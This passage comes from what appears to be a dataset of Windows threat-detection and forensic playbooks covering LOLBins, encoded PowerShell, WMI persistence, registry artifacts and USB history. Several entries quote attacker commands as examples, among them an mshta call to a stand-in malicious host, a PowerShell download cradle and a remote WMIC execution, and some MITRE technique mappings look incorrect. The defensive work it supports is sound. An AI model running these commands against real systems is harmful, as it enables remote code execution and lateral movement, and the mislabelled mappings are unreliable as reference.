
- **Attack Type**: DLL Sideloading
- **Target**: Windows Host
- **Vulnerability**: DLL Sideloading via rundll32
- **MITRE**: T1218.011
- **Impact**: Evasion and Execution
- **Tools**: Event Logs, Process Hacker, Sysmon
- **Scenario**: Rundll32.exe used to execute attacker DLLs
- **Attack Steps**: 1. Look for rundll32.exe executions in Sysmon Event ID 1. 2. Review command line for suspicious DLL paths or function calls. 3. Use Event ID 4688 for correlation. 4. Open Process Hacker and trace memory-mapped DLLs in the target process. 5. Dump DLL and check against threat intel hashes. 6. Use PE analysis tools (PEStudio) to examine DLL entry points. 7. Verify signature of rundll32.exe — is it the legitimate Windows version? 8. Investigate persistence if DLL is launched at boot. 9. Map user and machine involved. 10. Create block rule in EDR for suspicious rundll32 command lines.
- **Detection**: Command line analysis + memory inspection
- **Solution**: Block rundll32 misuse via command inspection
- **Tags**: rundll32, dll, memory, sideloading

## Mshta Abuse to Launch Script

- **Attack Type**: Scripting Execution
- **Target**: Windows System
- **Vulnerability**: HTA Execution
- **MITRE**: T1218.005
- **Impact**: Remote Script Execution
- **Tools**: Event Logs, Sysmon, Procmon
- **Scenario**: Mshta.exe used to run remote or embedded HTA payloads
- **Attack Steps**: 1. Filter Sysmon Event ID 1 for mshta.exe. 2. Look for arguments that include URLs or embedded base64 scripts. 3. Confirm with Event ID 4688. 4. Use Procmon to capture registry or file activity launched by mshta. 5. Check for persistence using scheduled tasks or registry Run keys. 6. Download HTA if hosted remotely and examine its behavior. 7. Use browser history or DNS logs to track access. 8. Confirm signature of mshta.exe and verify parent process. 9. Isolate endpoint and inspect for other LOLBin usage. 10. Alert on mshta executing from unexpected parent (e.g., outlook.exe).
- **Detection**: Command-line + DNS + procmon trace
- **Solution**: Block mshta via AppLocker or GPO
- **Tags**: mshta, lolbin, hta, script

## Command-Line Tool Obfuscation Using Encoded Arguments

- **Attack Type**: Obfuscation
- **Target**: Endpoint
- **Vulnerability**: Obfuscated Arguments Not Flagged
- **MITRE**: T1027
- **Impact**: Defense Evasion
- **Tools**: Sysmon, CyberChef, Event Logs
- **Scenario**: PowerShell or cmd.exe invoked with encoded strings to evade detection
- **Attack Steps**: 1. Collect all PowerShell and cmd.exe executions via Sysmon ID 1 and Security 4688. 2. Search for usage of -enc, -e, or base64 blobs. 3. Decode encoded strings using CyberChef. 4. Analyze decoded script for download, execution, or persistence behavior. 5. Link command to its parent process. 6. Examine execution timing — is it post-login, post-email open? 7. Check if the encoded command connects to external IPs or drops files. 8. Document decoding process and attach sample payloads. 9. Tune alerting to flag -enc usage across the network. 10. Educate SOC analysts on encoded command patterns.
- **Detection**: base64 detection + process lineage
- **Solution**: Flag encoded command-line args
- **Tags**: encoded, obfuscation, powershell

## PowerShell Download Cradle Detected

- **Attack Type**: Command Line Analysis
- **Target**: Windows Endpoint
- **Vulnerability**: PowerShell misuse
- **MITRE**: T1059.001
- **Impact**: Remote payload execution
- **Tools**: Event Viewer, Sysmon, PowerShell logs
- **Scenario**: Detection of an attacker using PowerShell to download and execute a payload via a base64-encoded command.
- **Attack Steps**: 1. Open Event Viewer and navigate to "Windows PowerShell" logs.2. Filter for Event ID 4104 to view executed PowerShell scripts.3. Spot a suspicious long Base64 string in the command (e.g., powershell -EncodedCommand), indicating possible obfuscation.4. Decode the string using PowerShell ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(...))) to reveal attacker intent.5. Observe commands like IEX (New-Object Net.WebClient).DownloadString(...) pointing to external URLs.6. Correlate timestamps with network logs to confirm outbound connection.7. Check browser and DNS cache for the target domain.8. Capture dropped files or processes started after execution.9. Isolate endpoint for forensic triage.
- **Detection**: PowerShell logs (4104), Sysmon 1
- **Solution**: Block PowerShell web access, enable Constrained Language Mode
- **Tags**: powershell, encoded, download cradle, base64

## Suspicious Use of WMIC for Lateral Movement

- **Attack Type**: WMI Analysis
- **Target**: Windows Infrastructure
- **Vulnerability**: Exposed WMI access
- **MITRE**: T1047
- **Impact**: Remote command execution
- **Tools**: Sysmon, Event Logs, WMIC
- **Scenario**: An attacker abuses WMIC to execute a command remotely on another host.
- **Attack Steps**: 1. Analyze logs from Sysmon (Event ID 1 for process creation).2. Identify the command wmic /node:<target-ip> process call create "cmd.exe /c whoami".3. Check for credentials used or available during the attack (likely pass-the-hash or valid credentials).4. Validate source and destination machines for user session correlation.5. Inspect Security Logs on remote host for logon attempts (Event ID 4624).6. Review Task Scheduler logs or service logs if persistence followed.7. Confirm whether command executed and created new processes.8. Investigate whether attacker used this as a pivot point.9. Isolate involved systems and escalate for lateral movement containment.
- **Detection**: Sysmon Event ID 1, Security logs
- **Solution**: Harden WMI access, block remote WMIC via GPO
- **Tags**: wmic, lateral, remote execution

## LOLBin Abuse via mshta

- **Attack Type**: Command Line Analysis
- **Target**: Windows Workstation
- **Vulnerability**: LOLBin misuse
- **MITRE**: T1218.005
- **Impact**: Initial access or persistence
- **Tools**: ProcMon, Sysmon, Event Logs
- **Scenario**: Attacker uses mshta.exe to execute malicious HTML application from remote server.
- **Attack Steps**: 1. Identify abnormal mshta.exe execution using Sysmon or EDR.2. Observe command like mshta http://malicious.site/payload.hta in logs.3. Trace child processes spawned from mshta.4. Use ProcMon to verify file system or registry changes.5. Investigate if the HTA file dropped additional payloads.6. Check browser history or DNS cache for accessed URL.7. Review network traffic logs for contact with malicious IPs.8. Scan memory or dump process using Volatility to find in-memory scripts.9. Contain system and block domain/IP at network level.
- **Detection**: Sysmon Event ID 1, DNS logs
- **Solution**: Block mshta via AppLocker, firewall filtering
- **Tags**: LOLBin, mshta, HTA

## CMD Obfuscation Detected

- **Attack Type**: Command Line Analysis
- **Target**: Windows
- **Vulnerability**: CMD abuse
- **MITRE**: T1059.003
- **Impact**: Execution of hidden scripts
- **Tools**: Sysmon, PowerShell logs, EDR
- **Scenario**: Attacker disguises commands using environment variable tricks in CMD.
- **Attack Steps**: 1. Review Sysmon logs for abnormal cmd.exe invocations.2. Detect usage of obfuscation like set a=calc&%a% or cmd /c %temp%\script.bat.3. Track creation and execution of intermediate script files.4. Inspect those scripts using Notepad++ or strings command.5. Link execution time with user session and network activity.6. Use PowerShell history or autoruns to check for persistence.7. Run Yara rules against scripts for known malware patterns.8. Memory dump may reveal original payload if removed from disk.9. Quarantine and reimage if persistence detected.
- **Detection**: CMD/Sysmon correlation
- **Solution**: Block CMD script abuse via GPO, train users
- **Tags**: cmd, obfuscation, batch

## Attacker Uses WMI for Persistence

- **Attack Type**: WMI Analysis
- **Target**: Windows Workstation
- **Vulnerability**: WMI misuse
- **MITRE**: T1546.003
- **Impact**: Stealth persistence
- **Tools**: WMI Explorer, Autoruns, Sysmon
- **Scenario**: Use of WMI Event Subscription for stealthy persistence.
- **Attack Steps**: 1. Use Sysmon Event ID 19 (WMI filter), 20 (consumer), 21 (binding) to identify creation of WMI permanent event subscriptions.2. Cross-reference timestamps for when these were created.3. Use wmic /namespace:\\root\subscription PATH __EventFilter to list filters.4. Dump WMI repository and parse using PowerShell or WMI Explorer.5. Identify consumers like script execution or command lines.6. Check if the triggered process is a known LOLBin or malware.7. Review if event filter is tied to login, time, or specific app triggers.8. Remove malicious subscriptions and restart WMI service.9. Monitor for re-creation to check for persistence mechanism.
- **Detection**: Sysmon 19–21, manual inspection
- **Solution**: Remove WMI subscription, harden with WMI monitoring
- **Tags**: wmi, persistence, evasion

## Encoded PowerShell via Registry

- **Attack Type**: Command Line Analysis
- **Target**: Windows
- **Vulnerability**: Registry abuse
- **MITRE**: T1112
- **Impact**: Stealthy execution
- **Tools**: Autoruns, Regedit, PowerShell
- **Scenario**: Attacker stores Base64-encoded PowerShell command in registry key.
- **Attack Steps**: 1. Use Autoruns to scan for unusual Run keys under HKCU\Software\Microsoft\Windows\CurrentVersion\Run.2. Locate suspicious entries pointing to powershell -EncodedCommand.3. Decode the Base64 command using PowerShell manually.4. Analyze the decoded script for downloader, persistence, or lateral movement behavior.5. Inspect timeline of registry modification using LastWriteTime or Registry Explorer.6. Check for additional registry keys storing payloads (under RunOnce, RunServices).7. Review user activity during time of modification.8. Check for dropped files, C2 beacons, or other IOCs.9. Delete malicious registry keys and block encoding in PowerShell policies.
- **Detection**: Autoruns, Registry inspection
- **Solution**: Restrict encoded PowerShell, enable logging
- **Tags**: registry, encoded, powershell

## Base64 PowerShell Obfuscation

- **Attack Type**: Command Line Analysis
- **Target**: Windows
- **Vulnerability**: PowerShell misuse
- **MITRE**: T1059.001
- **Impact**: Hidden script execution
- **Tools**: PowerShell, Sysmon, CyberChef
- **Scenario**: Obfuscated PowerShell command using base64 to hide intentions.
- **Attack Steps**: 1. Extract base64 strings from PowerShell logs (Event ID 4104).2. Decode using CyberChef or PowerShell base64 decoding.3. Identify actions like downloading payloads, invoking Win32 APIs, or persistence setups.4. Correlate with process creation logs to confirm execution.5. Match execution time with any network anomaly.6. Confirm child processes like rundll32 or cmd being spawned.7. Use memory forensics if script leaves no disk trace.8. Block the execution path via AppLocker or WDAC.9. Add decoding detection to SIEM pipeline.
- **Detection**: PowerShell log 4104
- **Solution**: Decode & monitor, policy enforcement
- **Tags**: powershell, base64, obfuscation

## WMI Backdoor Execution

- **Attack Type**: WMI Analysis
- **Target**: Windows
- **Vulnerability**: WMI event misuse
- **MITRE**: T1546.003
- **Impact**: Hidden execution path
- **Tools**: Sysmon, WMI Explorer, Volatility
- **Scenario**: Backdoor triggers execution using WMI filter/consumer.
- **Attack Steps**: 1. Review Sysmon Events 19–21 for WMI activity.2. Use WMI Explorer to dump __EventConsumer and __EventFilter settings.3. Look for suspicious filters tied to triggers like user logon or time interval.4. Analyze consumer code (scripts or commands) for malware-like behavior.5. Investigate linked executables using PE analysis tools.6. Dump WMI repository and parse for artifacts.7. Search memory for artifacts if executables are not on disk.8. Disable or delete WMI filter/consumer bindings.9. Alert SOC for behavioral rule creation.
- **Detection**: WMI/Sysmon correlation
- **Solution**: Delete malicious filters, create alerts
- **Tags**: wmi, backdoor, evasion

## ScriptBlock Logging Disabled

- **Attack Type**: Command Line Analysis
- **Target**: Windows
- **Vulnerability**: Logging evasion
- **MITRE**: T1562.001
- **Impact**: Loss of visibility
- **Tools**: PowerShell, Event Viewer, Registry
- **Scenario**: Attacker disables PowerShell logging before executing payloads.
- **Attack Steps**: 1. Use Event Viewer to check for PowerShell logs suddenly going silent.2. Inspect registry keys under HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging.3. Identify timestamp and user involved in change.4. Use Sysmon to catch PowerShell execution despite logging disabled.5. Check system startup scripts or Group Policy changes.6. Enable logging again using GPO or local policy.7. Run memory analysis to retrieve any executed script content.8. Create alerting rules for sudden log disablement.9. Harden logging configuration via registry ACLs.
- **Detection**: Registry & GPO audit
- **Solution**: Enforce script block logging
- **Tags**: logging, powershell, evasion

## WMI Used for Scheduled Execution

- **Attack Type**: WMI Analysis
- **Target**: Windows
- **Vulnerability**: Scheduled execution
- **MITRE**: T1053.005
- **Impact**: Stealth persistence
- **Tools**: Event Viewer, WMI Explorer, Task Scheduler
- **Scenario**: Attacker schedules script using WMI based on time or idle trigger.
- **Attack Steps**: 1. Dump WMI subscriptions from root\subscription namespace.2. Identify time-based filters like TimerInterval or TimerEventTrigger.3. Link filters to consumers executing scripts or binaries.4. Correlate with system uptime to check if executed.5. Use Autoruns or Task Scheduler to confirm alternative persistence.6. Kill processes linked to WMI trigger.7. Isolate any dropped payloads.8. Restore normal WMI structure.9. Monitor for re-creation attempts post-cleanup.
- **Detection**: WMI logs, Task Scheduler
- **Solution**: Remove trigger, monitor recreation
- **Tags**: wmi, scheduler, stealth

## Investigating Run Key for Persistence

- **Attack Type**: Persistence Investigation
- **Target**: Workstation
- **Vulnerability**: Misused autorun registry key
- **MITRE**: T1547.001
- **Impact**: Malware persistence after reboot
- **Tools**: Autoruns, Regedit, KAPE
- **Scenario**: Analysts suspect a persistent malware that re-executes on reboot.
- **Attack Steps**: 1. Open regedit.exe as Administrator.2. Navigate to HKCU\Software\Microsoft\Windows\CurrentVersion\Run.3. Look for suspicious entries referencing unknown executables.4. Use KAPE or Autoruns to extract and review the same keys at scale.5. Investigate the referenced file paths for anomalies (e.g., executables in temp folders).6. Cross-check hash values with VirusTotal.7. Note user context to identify the compromised profile.
- **Detection**: Registry monitoring via Sysmon (Event ID 13)
- **Solution**: Remove registry entry, delete malicious file
- **Tags**: persistence, registry, run key

## Analyzing USB History from Registry

- **Attack Type**: Post-Incident Device History
- **Target**: Corporate Endpoint
- **Vulnerability**: Lack of USB monitoring
- **MITRE**: T1052.001
- **Impact**: Data exfiltration via removable media
- **Tools**: USBDeview, Registry Viewer, RECmd
- **Scenario**: Insider threat suspected to have copied data to a USB.
- **Attack Steps**: 1. Dump SYSTEM and SOFTWARE registry hives using FTK Imager or KAPE.2. Use USBDeview or RECmd to parse USB connection history from SYSTEM\CurrentControlSet\Enum\USBSTOR.3. Correlate serial numbers and vendor details to known devices.4. Note last insertion timestamps and user SIDs.5. Identify file operations during that time window using shellbags or prefetch.6. Confirm device usage with USB-related event logs (Event ID 2003).
- **Detection**: Registry + USB logs correlation
- **Solution**: Enforce USB lockdown policies and endpoint logging
- **Tags**: usb history, registry, insider threat

## Registry Service Key Abuse

- **Attack Type**: Service-based Persistence
- **Target**: Windows Server
- **Vulnerability**: Unmonitored service registry
- **MITRE**: T1543.003
- **Impact**: Rogue service with SYSTEM privileges
- **Tools**: Autoruns, RegRipper, Regedit
- **Scenario**: Attacker created a rogue service that auto-starts during boot.
- **Attack Steps**: 1. Launch Autoruns.exe and filter for services.2. Identify unknown or unsigned service entries.3. Locate corresponding registry key: HKLM\SYSTEM\CurrentControlSet\Services\<serviceName>.4. Analyze ImagePath value for suspicious executables.5. Use sc qc command to get full config and check for service type.6. Use RegRipper plugin services to automate bulk analysis.
- **Detection**: Event logs + registry key change monitoring
- **Solution**: Delete service, clean registry, disable file
- **Tags**: service abuse, autoruns, registry

## Discovering Recent Apps via Registry

- **Attack Type**: User Activity Forensics
- **Target**: Workstation
- **Vulnerability**: App execution visibility gap
- **MITRE**: T1082
- **Impact**: Identifying lateral movement tools or stealers
- **Tools**: Regedit, RECmd, ShellBags Explorer
- **Scenario**: SOC team reviews suspicious app launches during a compromise.
- **Attack Steps**: 1. Launch Registry Editor and navigate to:HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs.2. Review MRUList for recently accessed documents and file types.3. Investigate UserAssist keys for application run counts.4. Decode ROT13-encoded entries to reveal app names.5. Use ShellBags Explorer to correlate app interaction with folder access.6. Timeline the activity with other event logs for context.
- **Detection**: Monitor UserAssist keys and timestamps
- **Solution**: Enable user-level logging, SIEM integration
- **Tags**: registry, recent apps, userassist

## Tracing Malware via RunOnce Key

- **Attack Type**: Persistence via RunOnce
- **Target**: Virtual Machine
- **Vulnerability**: RunOnce execution not monitored
- **MITRE**: T1547.001
- **Impact**: One-time execution for payload drop
- **Tools**: Regedit, Volatility, Autoruns
- **Scenario**: Malware drops a payload that executes only once at next boot.
- **Attack Steps**: 1. Load the infected image into Volatility and dump registry hives.2. Analyze HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce.3. Note filenames and temp paths (often self-deleting payloads).4. Use memory artifacts to retrieve deleted file content.5. Correlate timestamps with system logs.6. Check for similar persistence across other registry keys.
- **Detection**: Registry + boot event correlation
- **Solution**: Monitor registry changes via Sysmon
- **Tags**: runonce, volatile malware, registry

## Extracting AppCompatCache (ShimCache)

- **Attack Type**: Historical Execution Analysis
- **Target**: Windows OS
- **Vulnerability**: ShimCache not cleared often
- **MITRE**: T1005
- **Impact**: Forensic timeline of app execution
- **Tools**: AppCompatCacheParser, KAPE, RECmd
- **Scenario**: Analysts need to reconstruct program executions over time.
- **Attack Steps**: 1. Dump SYSTEM hive from compromised machine.2. Parse with AppCompatCacheParser or KAPE’s module.3. Review list of executables, with last modification and execution indicators.4. Highlight paths outside normal program files (e.g., temp, downloads).5. Correlate with known malware droppers or suspicious hashes.6. Use this info to reconstruct infection timeline.
- **Detection**: ShimCache extraction and triage
- **Solution**: Regular endpoint scan + AppCompat parsing
- **Tags**: shimcache, execution, registry

## Detecting Fake AV Startup via Registry

- **Attack Type**: Fake Antivirus Detection
- **Target**: Consumer Laptop
- **Vulnerability**: Social engineering + registry persistence
- **MITRE**: T1059
- **Impact**: Fake sense of protection + telemetry theft
- **Tools**: Autoruns, Regedit, Event Viewer
- **Scenario**: A fake antivirus installs and persists through registry keys.
- **Attack Steps**: 1. Use Autoruns to identify unknown AV entries in HKLM\...\Run.2. Investigate file path—fake AVs usually point to odd temp paths.3. Cross-check with real AV vendor details.4. Observe process behavior via Task Manager or Process Hacker.5. Correlate with system logs for install and execution times.6. Remove registry entry and file after confirmation.
- **Detection**: Registry + process + signature scan
- **Solution**: Security awareness + AV control
- **Tags**: fake av, run key, registry

## Registry Artifact Hunt for Remote Access Tool

- **Attack Type**: RAT Detection
- **Target**: Endpoint
- **Vulnerability**: Hidden RAT persistence
- **MITRE**: T1053.005
- **Impact**: Covert access, data theft
- **Tools**: RegRipper, Autoruns, FTK Imager
- **Scenario**: An attacker planted a hidden RAT and used registry for stealth.
- **Attack Steps**: 1. Acquire SYSTEM and NTUSER hives from suspected host.2. Use RegRipper plugins: run, services, ntuser-run.3. Identify paths to executables in AppData, Temp, or Recycle Bin.4. Observe for encoded entries or renamed system tools.5. Match activity with remote connections in firewall logs.6. Flag and remove persistence mechanism.
- **Detection**: Registry + Netstat + event correlation
- **Solution**: Endpoint isolation and wipe
- **Tags**: rat, autoruns, registry

## Hunting Backdoor via Registry Shell

- **Attack Type**: Reverse Shell Persistence
- **Target**: Server
- **Vulnerability**: Winlogon shell hijack
- **MITRE**: T1546.008
- **Impact**: Persistent reverse shell on login
- **Tools**: Regedit, Autoruns, RECmd
- **Scenario**: Reverse shell configured to auto-launch via shell registry.
- **Attack Steps**: 1. Check key: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell.2. Normal value is explorer.exe.3. Identify appended executables (e.g., explorer.exe, malware.exe).4. Investigate file referenced and its behavior.5. Compare hash with known reverse shell tools.6. Delete rogue value and executable.
- **Detection**: Shell key integrity monitoring
- **Solution**: Monitor + baseline shell values
- **Tags**: reverse shell, winlogon, registry

## Timeline Correlation Using Registry LastWrite

- **Attack Type**: Registry Time Forensics
- **Target**: Any Windows Device
- **Vulnerability**: Registry key modification analysis
- **MITRE**: T1070.004
- **Impact**: Attribution of attacker activity
- **Tools**: RECmd, Plaso, KAPE
- **Scenario**: Incident handler creates a timeline from registry artifact changes.
- **Attack Steps**: 1. Collect SYSTEM, SOFTWARE, NTUSER hives from image or host.2. Use RECmd to extract LastWrite timestamps from keys of interest.3. Import output into Plaso or Timeline Explorer.4. Combine with MFT, event logs, prefetch.5. Look for suspicious persistence entries with close timestamps.6. Reconstruct attacker timeline of changes and accesses.
- **Detection**: Timeline generation from registry
- **Solution**: Cross-tool timeline + correlation
- **Tags**: registry, timeline, forensics

## Analyzing 'RunOnce' Keys for Persistence

- **Attack Type**: Registry Hive Analysis
- **Target**: Windows Workstation
- **Vulnerability**: Abuse of RunOnce registry key for persistence
- **MITRE**: T1547.001 (Registry Run Keys/Startup Folder)
- **Impact**: Stealthy persistence mechanism triggered after reboot
- **Tools**: Registry Editor, Autoruns, KAPE
- **Scenario**: Detecting malware that auto-starts on next boot using RunOnce keys.
- **Attack Steps**: 1. Launch Registry Editor (regedit). 2. Navigate to HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce. 3. Note any unusual executables or scripts set to run once. 4. Use Autoruns to verify auto-run entries from a GUI. 5. Cross-reference the file path with known malware signatures or hash it for VT scanning. 6. Export suspicious entries for reporting. 7. Optionally use KAPE with RegistryHives module to pull these artifacts at scale.
- **Detection**: Compare with baseline registry keys; use Autoruns for visibility
- **Solution**: Remove or quarantine malicious keys and associated executables
- **Tags**: registry, persistence, runonce, autoruns

## USB Device History via Registry Inspection

- **Attack Type**: Registry Hive Analysis
- **Target**: Windows Host
- **Vulnerability**: Unauthorized data exfiltration or malware via USB
- **MITRE**: T1200 (Hardware Additions)
- **Impact**: Trace of removable device potentially used for data theft
- **Tools**: RegRipper, Registry Explorer, USBDeview
- **Scenario**: Investigating if a USB device was connected on a suspect’s system.
- **Attack Steps**: 1. Extract SYSTEM and SOFTWARE hives from suspect machine. 2. Load into Registry Explorer or analyze via RegRipper plugins (usb, usbstor). 3. Review keys like HKLM\SYSTEM\CurrentControlSet\Enum\USBSTOR. 4. Look for VID/PID to identify specific USB devices. 5. Check MountedDevices to associate drive letters. 6. Note timestamp info for first connection via LastWrite. 7. Correlate with user activity timelines.
- **Detection**: USBSTOR registry keys; logon correlation; timestamp analysis
- **Solution**: Implement USB control policies; monitor registry changes
- **Tags**: usb, registry, forensic timeline, removable media

## App Execution Evidence via ShimCache

- **Attack Type**: ShimCache Analysis
- **Target**: Windows Host
- **Vulnerability**: Malware execution via non-persistent file
- **MITRE**: T1005, T1059
- **Impact**: Reveals programs executed even if deleted later
- **Tools**: AppCompatCacheParser, Arsenal Image Mounter
- **Scenario**: Discover if a malicious executable ran on a system using ShimCache.
- **Attack Steps**: 1. Obtain SYSTEM hive from compromised machine. 2. Use AppCompatCacheParser or Arsenal Recon to parse the AppCompatCache (ShimCache). 3. Identify executable file paths along with timestamps (last modified). 4. Filter out known good software and flag suspicious binaries (e.g., in Temp, AppData). 5. Hash suspicious executables for malware checks. 6. Cross-reference with Prefetch data for execution confirmation. 7. Add entries to event timeline.
- **Detection**: ShimCache parsing and prefetch overlap
- **Solution**: Monitor for frequent changes in AppCompatCache; isolate machines after incident
- **Tags**: appcompatcache, shimcache, malware execution

## Network Beacons from Malware via SRUM

- **Attack Type**: SRUM Inspection
- **Target**: Windows 8+ System
- **Vulnerability**: Stealthy network communication using built-in apps
- **MITRE**: T1071 (Application Layer Protocol)
- **Impact**: Reveals covert communication attempts
- **Tools**: SRUM-Dump, Plaso, Nirsoft NetworkTools
- **Scenario**: Identify malware attempting regular external communication.
- **Attack Steps**: 1. Extract the SRUDB.dat from %windir%\System32\sru. 2. Use SRUM-Dump or Plaso to parse and timeline SRUM entries. 3. Identify Application Resource Usage for network usage by process. 4. Flag abnormal outbound traffic patterns (e.g., CLI tools, PowerShell). 5. Correlate process paths to user accounts. 6. Link to known C2 indicators if available. 7. Use this data to confirm beaconing attempts.
- **Detection**: Compare SRUM network logs to baseline; detect unusual process-network pairings
- **Solution**: Block suspicious outbound domains; update IPS rules
- **Tags**: srum, beaconing, C2, resource usage

## Locating Recent Apps Used by User

- **Attack Type**: Registry Hive Analysis
- **Target**: Windows Host
- **Vulnerability**: Evidence of program usage or exfiltration tools
- **MITRE**: T1003, T1059
- **Impact**: Tracks user interaction with executables
- **Tools**: Registry Explorer, ShellBag Explorer
- **Scenario**: Find the last executed applications for a given user.
- **Attack Steps**: 1. Load NTUSER.DAT hive from suspect profile. 2. Navigate to Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs. 3. Analyze recently accessed documents and associated apps. 4. Check UserAssist key to gather user interaction with executables. 5. Decode ROT13 values in UserAssist for file paths. 6. Correlate with shellbags and timeline artifacts. 7. Document apps with abnormal locations (e.g., Temp, .bat files).
- **Detection**: Event logs, shellbags, UserAssist decoding
- **Solution**: Alert on use of uncommon apps; restrict unauthorized portable apps
- **Tags**: registry, recentdocs, userassist, app history

## Shellbags Analysis for Folder Access Timeline

- **Attack Type**: Shellbags Inspection
- **Target**: Windows Workstation
- **Vulnerability**: Evidence of interaction with suspicious directories
- **MITRE**: T1083
- **Impact**: File/folder access tracking
- **Tools**: ShellBags Explorer, RegRipper
- **Scenario**: Reconstruct user's folder navigation history to track file access.
- **Attack Steps**: 1. Load NTUSER.DAT and USRCLASS.DAT hives. 2. Use ShellBags Explorer or RegRipper to parse shellbag entries. 3. Review folder access paths including network shares and USB volumes. 4. Extract timestamps for folder access. 5. Flag access to suspect folders like Downloads, Temp, AppData. 6. Match with known IOCs or filenames. 7. Incorporate into larger timeline with event logs.
- **Detection**: Detect interaction with known IOC paths
- **Solution**: Audit suspicious folders; monitor for unauthorized access
- **Tags**: shellbags, folder forensics, access timeline

## Detecting Service Persistence via Registry Keys

- **Attack Type**: Registry Hive Analysis
- **Target**: Windows Host
- **Vulnerability**: Persistence via malicious service registration
- **MITRE**: T1543.003
- **Impact**: Automatic malware execution via service start
- **Tools**: Autoruns, RegRipper
- **Scenario**: Identify malicious Windows services set to auto-start.
- **Attack Steps**: 1. Extract SYSTEM hive from compromised system. 2. Navigate to HKLM\SYSTEM\CurrentControlSet\Services. 3. Review service entries for suspicious image paths. 4. Check the service start type—look for Start=2 (auto). 5. Use Autoruns to visually confirm the services. 6. Cross-check suspicious services with online threat intelligence. 7. Disable and quarantine service binary if malicious.
- **Detection**: Registry + service image path verification
- **Solution**: Block and delete malicious service entries
- **Tags**: persistence, services, registry, autoruns

## Identifying Malware via Prefetch Signatures

- **Attack Type**: Prefetch Artifact Correlation
- **Target**: Windows Host
- **Vulnerability**: Traces of executed malware from Prefetch
- **MITRE**: T1003
- **Impact**: Forensic confirmation of execution
- **Tools**: PECmd, WinPrefetchView
- **Scenario**: Confirm execution of malicious files using prefetch traces.
- **Attack Steps**: 1. Collect .pf files from C:\Windows\Prefetch. 2. Use PECmd or WinPrefetchView to parse contents. 3. Identify executable name, run count, and last execution time. 4. Review loaded DLLs and referenced files. 5. Look for odd paths like from AppData, Temp. 6. Correlate findings with known malware hashes. 7. Confirm execution timeframe for timeline mapping.
- **Detection**: Monitor changes in prefetch cache
- **Solution**: Harden execution policies and maintain image hashes
- **Tags**: prefetch, execution, forensic, timeline

## Linking User and App Launch with UserAssist

- **Attack Type**: Registry Analysis
- **Target**: Windows Workstation
- **Vulnerability**: Execution of suspicious tools by user
- **MITRE**: T1059
- **Impact**: Proven user-based app launches
- **Tools**: Registry Explorer, UserAssistView
- **Scenario**: Map which user launched which applications based on registry artifacts.
- **Attack Steps**: 1. Load NTUSER.DAT file from target user. 2. Navigate to Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist. 3. Decode ROT13 values to obtain cleartext app paths. 4. Review run count and timestamps for user interactions. 5. Identify uncommon executables or tools launched by user. 6. Correlate with ShimCache, Prefetch, and logs. 7. Note privilege context if available.
- **Detection**: Decode and correlate UserAssist registry data
- **Solution**: Train staff on app usage policy, audit suspicious activity
- **Tags**: userassist, user behavior, execution

## Triaging Persistence from Multiple Hive Keys

- **Attack Type**: Registry Hive Triaging
- **Target**: Windows Host
- **Vulnerability**: Multi-point registry persistence techniques
- **MITRE**: T1547
- **Impact**: System compromise via registry abuse
- **Tools**: KAPE, Autoruns, RegRipper
- **Scenario**: Identify all possible persistence locations in registry quickly.
- **Attack Steps**: 1. Use KAPE with targets like RegistryHives, Autoruns, and Amcache. 2. Extract Run, RunOnce, Services, Winlogon, and AppInit_DLLs keys. 3. Parse with RegRipper or KAPE modules. 4. Detect unfamiliar binaries or DLLs in these keys. 5. Map binary paths to known malware signatures. 6. Build a profile of persistence behavior. 7. Cross-reference findings with running processes and scheduled tasks.
- **Detection**: Registry diffing and cross-hive comparison
- **Solution**: Periodic scans, endpoint hardening
- **Tags**: registry, autoruns, persistence, hive triage

## Investigating RunOnce Key Abuse for Persistence

- **Attack Type**: Persistence Analysis
- **Target**: Windows System
- **Vulnerability**: Abuse of RunOnce key for stealthy persistence
- **MITRE**: T1547.001 (Registry Run Keys / Startup Folder)
- **Impact**: Persistence after reboot, hidden malware activation
- **Tools**: RegRipper, Autoruns, Registry Editor
- **Scenario**: Adversaries use the RunOnce key to execute payloads after system reboot, enabling stealthy persistence mechanisms.
- **Attack Steps**: 1. Begin by acquiring a copy of the SYSTEM and SOFTWARE registry hives from the compromised machine.2. Use RegRipper with the runmru and runonce plugins to extract relevant persistence data.3. Open the results and look for unusual or non-standard executables listed in HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce.4. Cross-reference the executable paths with the known good baseline or whitelist.5. Use Autoruns to visualize active persistence entries and check for unsigned binaries or suspicious command-line arguments.6. Use VirusTotal or Hybrid Analysis to further analyze any unfamiliar binaries.7. If malicious, track parent-child processes using the corresponding Event Logs to see how the key was created or altered.8. Clean the key and isolate the binary for malware analysis.
- **Detection**: Registry hive comparison, Autoruns snapshot, baseline deviation
- **Solution**: Regular baseline registry snapshots and whitelist enforcement
- **Tags**: registry-analysis, runonce, persistence, forensic, autoruns

## USB Usage Tracing via Registry for Data Exfil

- **Attack Type**: Insider Threat
- **Target**: Workstation
- **Vulnerability**: Lack of USB usage monitoring
- **MITRE**: T1056.001 (Data Staged on Removable Media)
- **Impact**: Data theft via USB drives
- **Tools**: USBDeview, FTK Imager, Registry Explorer
- **Scenario**: Insider exfiltrated company files to a USB drive. Registry contains artifacts of USB insertions even if logs are cleared.
- **Attack Steps**: 1. Create a forensic image of the suspect’s device.2. Mount the image and extract the SYSTEM and SOFTWARE hives.3. Use USBDeview or Registry Explorer to parse HKLM\SYSTEM\CurrentControlSet\Enum\USBSTOR and identify recently connected USB devices.4. Note down the VID, PID, and serial number of USB devices.5. Cross-check with timestamps under MountPoints2 in NTUSER.DAT of the user to determine last use.6. Check SetupAPI.dev.log to find installation dates and times of the USB devices.7. Use MFT analysis tools to correlate USB plugin time with file copy actions.8. Build a timeline showing when USB was inserted, which files were accessed, and if data was copied out.9. Confirm intent and match to insider activity or suspicious file movement.
- **Detection**: Registry USB history + MFT correlation
- **Solution**: Use USB blocking policy or monitor USB write activity using DLP tools
- **Tags**: registry, usb-forensics, insider-threat, SRUM, timeline-analysis

## RecentApps Registry Keys Reveal Suspicious Execution

- **Attack Type**: Post-Execution Tracing
- **Target**: Windows User
